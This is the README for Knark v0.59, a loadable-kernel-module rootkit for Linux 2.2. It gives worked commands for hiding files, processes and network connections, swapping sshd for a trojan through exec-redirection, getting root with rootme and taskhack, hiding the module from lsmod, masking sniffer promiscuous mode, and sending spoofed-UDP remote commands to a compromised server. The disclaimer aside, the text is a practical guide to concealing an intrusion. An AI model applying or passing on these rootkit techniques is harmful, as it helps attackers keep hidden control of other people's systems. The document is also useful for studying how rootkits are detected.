.. .readme-knark:



		Knark v0.59 by Creed @ #hack.se
		   email: creed@sekure.net



Knark is a kernel-based rootkit for Linux 2.2.
==============================================

No part of knark may be used to break the law, or to cause damage of any
kind. And I'm not responsible for anything you do with it.


The heart of the package, knark.c, is a Linux lkm (loadable kernel-module).
Type "make" to compile knark and the programs included, and then "insmod knark"
to load the lkm. When knark is loaded, the hidden directory /proc/knark is
created. The following files are created in this directory:

author		shameless self-promotion banner :-)
files		list of hidden files on the system
nethides	list of strings hidden in /proc/net/[tcp|udp]
pids		list of hidden pids, ps-like output
redirects	list of exec-redirection entries



Changes since v0.50:
Added remote command execution, and added the client-program rexec.


These are the programs included in the package (they all depend on knark.o
to be loaded, except for taskhack.c which modifies /dev/kmem directly):


hidef	Used to hide files on the system.
	Create your hax0r-directory /usr/lib/.hax0r, and type:
	./hidef /usr/lib/.hax0r
	Now this directory will be hidden, and won't be shown by ls or du.
	Subdirs and files will be hidden as well, so you don't have to
	hidef anything you put in this directory.


unhidef	Used to unhide hidden files. You can cat /proc/knark/files if you've
	forgotten which files you've hidden. Type:
	./unhidef /usr/lib/.hax0r
	to make your previously hidden directory visible again.
	However, there is a bug in the module which makes directory trees
	start from their mount-point. This means, if you have a filesystem
	mounted to /mnt, and you hide the file /mnt/secret, this file will
	show up as /secret in /proc/knark/files. Files in the root-filesystem
	aren't affected.


ered	Used to configure exec-redirection.
	Copy your sshd trojan to /usr/lib/.hax0r/sshd_trojan, and type:
	./ered /usr/local/sbin/sshd /usr/lib/.hax0r/sshd_trojan
	Now, when /usr/local/sbin/sshd is supposed to be executed, your
	trojan program will be executed instead. To clear all exec-redirection
	entries, type:
	./ered -c


nethide	Used to hide strings in /proc/net/tcp and /proc/net/udp. This is
	where netstat gets it's information. Type:
	./nethide ":ABCD "
	to hide connections to/from port ABCD hex (43981 dec). This will
	"grep -v" the line ":ABCD " from /proc/net/[tcp|udp].
	You have to understand the output from /proc/net/[tcp|udp] to use
	this program. Lets say that you have sshd running on your box.
	Connect to localhost port 22, and type:
	netstat -at
	One of the lines looks like this:
	Proto Recv-Q Send-Q Local Address      Foreign Address  State
	tcp        0      0 localhost:ssh      localhost:1023   ESTABLISHED
	And now, lets check /proc/net/tcp. Type:
	cat /proc/net/tcp
	One of the lines looks like this:
	local_address rem_address   blablabla...
	0:0100007F:0016 0100007F:03FF 01 00000000:00000000 00:00000000 00000000
	If we want to hide everything about ip-address 127.0.0.1, we have to
	translate it to this format. Start with 127: 7F in hex. Then 0: 00
	in hex, which gives us 007F. And 0 again: 00007F, and at last 1
	which gives us the number 0100007F. Now, if we want to hide
	everything about port 22 and ip-address 127.0.0.1 it looks like this:
	0100007F:0016 (0016 is port 22 in hex). So, typing:
	./nethide "0100007F:0016" will hide connections to/from localhost
	port 22, and typing:
	./nethide ":ABCD " will remove all lines containing ":ABCD ". It's
	like "grep -v". Do you get it? :-)


rootme	Used to gain root-access without using suid programs. Type:
	./rootme /bin/sh
	to execute /bin/sh with root-privs. This will also work:
	./rootme /bin/ls -l /root
	You have to type the whole path-name of the binary to execute.


taskhack Used to change *uid's and *gid's of running processes. Type:
	./taskhack -alluid=0 pid
	This will change all *uid's (uid, euid, suid, fsuid) of process
	"pid" to 0 (root). Type:
	ps aux | grep bash
	creed       91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash
	Now, we want to change the euid of this process to 0 (root). Type:
	./taskhack -euid=0 91
	ps aux | grep bash
	root (!)    91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash
	Isn't this just great? :-).

*rexec	Used to execute commands remotely on a knark-server. Type:
*	./rexec www.microsoft.com haxored.server.nu /bin/touch /LUDER
*	This will send a spoofed udp packet from www.microsoft.com:53 to
*	haxored.server.nu:53, which tells haxored.server.nu to /bin/touch
*	/LUDER. If you want to try this on localhost, don't specify a
*	spoofed address different from your own, since the kernel won't
*	accept it.
*	./rexec localhost localhost /bin/touch /LUDER
*	will do it for you.

(* = newly added thing)


And knark has eaven more features than this:
sending signal 31 to a process will hide it's directory in /proc, making
it invisible to ps and top. Type:
kill -31 pid
If this process fork's or clone's, all childs of the process will be hidden.
This means, that if you hide your shell with kill -31, all commands you
issue will be invisible. That's neat :-).
If you want to make a process visible again for some reason, and you've
forgotten the pid, just cat /proc/knark/pids. This will give you a ps-like
output of all hidden processes.

Sniffers sets the network interface in promiscuous mode, and many simple
sniffer-detectors rely on this. When knark is loaded, no network interface
will show the IFF_PROMISC flag when SIOCGIFFLAGS is requested. Hiding the
sniffer with signal 31 is also recommended.

This package includes another lkm than knark; modhide. When modhide is
loaded, it removes the latest loaded module from the module list, thus
hiding it from lsmod, and removing it from /proc/modules. Type:
insmod knark
lsmod | grep knark
knark                   6640   0  (unused)
insmod modhide
(error messages)
lsmod | grep knark
*noting*

But be careful, you might have to reboot to get rid of knark if you load
modhide, since it can't be removed with normal methods, like rmmod.
Have fun. And stay out of trouble.

By the way, I don't recommend you to unload the module, there is some kind
of bug that can make strange things happen. Sometimes it works fine, sometimes
a process dies and sometimes your computer will look like a banana.
This is not a bug-free release. Please let me know if you find things to
improve.


.. code-block:: console

   email: creed@sekure.net
   Ircnet and EFNet: Creed (or Creed_ or something like that) @sekure.net
